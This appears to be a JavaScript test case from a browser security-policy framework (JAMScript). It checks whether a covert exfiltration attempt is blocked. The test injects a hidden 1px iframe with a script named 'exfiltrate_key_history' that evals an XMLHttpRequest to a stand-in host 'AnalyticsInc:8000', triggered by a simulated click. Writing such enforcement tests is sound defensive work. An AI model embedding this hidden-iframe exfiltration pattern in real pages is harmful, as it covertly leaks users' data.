function runTest() {
function click_inner(){var event=new Event("click"),v0=document.getElementById("test2");v0.dispatchEvent(event)}var v7=document.head,v1=v7.childNodes,pol=v1[5],v8=document.head,v2=v8.childNodes,tx=v2[7],button=document.getElementById("test"),button2=button.cloneNode(!0);button2.id="test2";var script=document.createElement("script");JAMScript.set(script,"innerHTML","function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
  var frm=document.createElement("iframe");JAMScript.call(frm.setAttribute,frm,["id","ifrm"]);JAMScript.call(frm.setAttribute,frm,["src","JavaScript:''"]);var v3=frm.style;v3.width="1px";var v4=frm.style;v4.height="1px";JAMScript.call(frm.appendChild,frm,[tx]);JAMScript.call(frm.appendChild,frm,[button2]);JAMScript.call(frm.appendChild,frm,[script]);var v5=document.body;JAMScript.call(v5.appendChild,v5,[frm]);var v6=document.getElementById("test");JAMScript.set(v6,"onclick",click_inner);

  return "RESULT NOT SPECIFIED";
}
